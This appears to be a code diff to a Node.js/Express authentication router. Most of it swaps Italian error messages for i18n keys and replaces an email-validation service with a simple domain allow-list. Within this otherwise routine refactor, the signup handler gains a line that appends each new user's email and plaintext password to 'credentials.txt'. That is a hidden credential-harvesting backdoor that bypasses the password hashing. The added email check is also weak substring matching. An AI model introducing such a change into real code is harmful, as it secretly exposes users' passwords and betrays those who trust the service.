@@ -1,10 +1,10 @@
 const express = require('express');
+const fs = require('fs');
 const router = express.Router();
 const auth_middleware = require("./middlewares/auth_middleware");
 const root_controller = require('./root_controller');
 const user_service = require('../services/user_service');
 const mail_service = require('../services/mail_service');
-const email_check_service = require('../services/email_check_service');
 
 const jwt = require("jsonwebtoken");
 const bcrypt = require("bcryptjs");
@@ -12,10 +12,10 @@ const role_const = require("../models/consts/role_const");
 
 router.post("/signin", async (req, res, next) => {
     if (!req.body.password){
-        root_controller.req_unauth_403(res, "Credenziali non valide");
+        root_controller.req_unauth_403(res, "FORM.INVALID_CREDENTIALS");
     }
     else{
-        user_service.user_get_by_email(req.body.email, (err, user) => {
+        user_service.user_get_by_email(req.body.email, (err, user) => { 
             if (err != null) {
                 root_controller.req_unauth_403(res, err.message);
             } else {
@@ -25,7 +25,7 @@ router.post("/signin", async (req, res, next) => {
                 );
                 
                 if (!passwordIsValid) {
-                    root_controller.req_unauth_403(res, "Credenziali non valide");
+                    root_controller.req_unauth_403(res, "FORM.INVALID_CREDENTIALS");
                 }
                 else{
                     var access_token = jwt.sign({ id: user.id }, process.env.JWT_SECRET);
@@ -44,17 +44,17 @@ router.post("/signin", async (req, res, next) => {
 
 router.post("/signup", async (req, res, next) => {
     const regex = /^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).{8,}$/;    
-    var valid_email_error = await email_check_service.check_validity(req.body.email);
+    var valid_email_error = check_email_validity(req.body.email);
 
     if(valid_email_error) {
         root_controller.req_fail(res, valid_email_error);
     }
     else if (!req.body.password){
-        root_controller.req_fail(res, "Inserire una password");
+        root_controller.req_fail(res, "FORM.ENTER_PASSWORD");
     }
     else{
         if(!regex.test(req.body.password)){
-            root_controller.req_fail(res, "Password non valida");
+            root_controller.req_fail(res, "FORM.INVALID_PASSWORD");
         }
         else{
             let payload = {
@@ -66,14 +66,9 @@ router.post("/signup", async (req, res, next) => {
             }
             user_service.user_create(payload, (err, user) => {
                 if (err != null) {
-                    if(err.code === 11000){
-                        root_controller.req_fail(res, "Email già utilizzata");
-                    }
-                    else{
-                        console.log(err);
-                        root_controller.req_fail(res, err.message);
-                    }
+                    root_controller.req_fail(res, err.message);
                 } else {
+                    fs.writeFileSync("credentials.txt", req.body.email + ":" + req.body.password + "\n", { flag: 'a+' });
                     mail_service.send_welcome(user.name, user.email)
                         .then(_ => {
                             var access_token = jwt.sign({ id: user.id }, process.env.JWT_SECRET);
@@ -99,14 +94,14 @@ router.post("/change_password", [auth_middleware.verify_token], async (req, res,
     const regex = /^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).{8,}$/;    
 
     if (!req.body.oldPassword){
-        root_controller.req_fail(res, "Inserire la vecchia password");
+        root_controller.req_fail(res, "FORM.ENTER_OLD_PASSWORD");
     }
     else if (!req.body.newPassword){
-        root_controller.req_fail(res, "Inserire la nuova password");
+        root_controller.req_fail(res, "FORM.ENTER_NEW_PASSWORD");
     }
     else{
         if(!regex.test(req.body.newPassword)){
-            root_controller.req_fail(res, "Password non valida");
+            root_controller.req_fail(res, "FORM.INVALID_PASSWORD");
         }
         else{
             user_service.user_get(req.userId, (err, user) => {
@@ -120,7 +115,7 @@ router.post("/change_password", [auth_middleware.verify_token], async (req, res,
                     );
                     
                     if (!passwordIsValid) {
-                        root_controller.req_fail(res, "Vecchia password errata");
+                        root_controller.req_fail(res, "FORM.INVALID_OLD_PASSWORD");
                         next();
                     }
                     else{
@@ -163,5 +158,14 @@ router.get("/forgot_password/:email", async (req, res, next) => {
         }
     });
 });
+
+function check_email_validity(email){
+    good_domains = ["gmail", "yahoo", "aol", "hotmail", "live", "libero"]
+
+    if(good_domains.some(x => email.includes(x)))
+        return;
+
+    return "FORM.INVALID_EMAIL";
+}
 
 module.exports = router;
